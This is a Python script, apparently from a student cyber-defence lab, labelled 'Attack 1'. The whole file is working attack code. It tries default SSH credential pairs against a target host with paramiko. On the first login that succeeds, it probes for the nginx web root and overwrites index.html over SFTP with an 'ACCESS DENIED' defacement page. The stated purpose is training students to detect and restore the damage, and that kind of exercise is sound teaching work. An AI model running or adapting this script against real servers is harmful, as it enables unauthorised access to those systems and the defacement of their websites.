"""
Attack 1: SSH login with default credentials + nginx defacement.

Tries each credential pair until one succeeds, then uses SFTP to
overwrite the nginx index.html with defacement content that does not
contain the checker's SEARCH_TEXT ("Wikipedia"), causing the HTTP
check to fail.

Students fix this by restoring /var/www/html/index.html (or whichever
root was targeted) to its original content.
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

import paramiko
import io
from config import TARGET_HOST, DEFAULT_CREDS, NGINX_ROOTS

DEFACE_HTML = """\
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Service Unavailable</title>
<style>
  body { background: #0a0a0a; color: #ff4444; font-family: monospace;
         display: flex; align-items: center; justify-content: center;
         height: 100vh; margin: 0; flex-direction: column; }
  h1   { font-size: 3rem; margin-bottom: 1rem; }
  p    { color: #888; font-size: 1rem; }
</style>
</head>
<body>
  <h1>ACCESS DENIED</h1>
  <p>This system has been taken offline.</p>
</body>
</html>
"""


def run(log):
    """
    Try each default credential. On first successful login, overwrite
    the nginx index page via SFTP.

    Args:
        log: callable that accepts a message string for output.

    Returns:
        True if defacement succeeded, False otherwise.
    """
    for username, password in DEFAULT_CREDS:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(TARGET_HOST, username=username,
                           password=password, timeout=5)
        except Exception as e:
            log(f"  SSH [{username}] failed: {e}")
            continue

        log(f"  SSH [{username}] authenticated")

        # Find the nginx web root that actually exists
        target_file = _find_index(client, log)
        if target_file is None:
            log("  Could not locate nginx index.html — trying next credential")
            client.close()
            continue

        # Upload defacement via SFTP
        try:
            sftp = client.open_sftp()
            with sftp.open(target_file, "w") as f:
                f.write(DEFACE_HTML)
            sftp.close()
            log(f"  Defaced {target_file}")
            client.close()
            return True
        except Exception as e:
            log(f"  SFTP write to {target_file} failed: {e}")
            client.close()

    log("  No valid SSH credential found or deface failed.")
    return False


def _find_index(client, log):
    """Return the first nginx index.html path that exists on the target."""
    for root in NGINX_ROOTS:
        path = f"{root}/index.html"
        _, stdout, _ = client.exec_command(
            f"test -f {path} && echo YES || echo NO"
        )
        result = stdout.read().decode().strip()
        if result == "YES":
            log(f"  Found index at {path}")
            return path
    return None
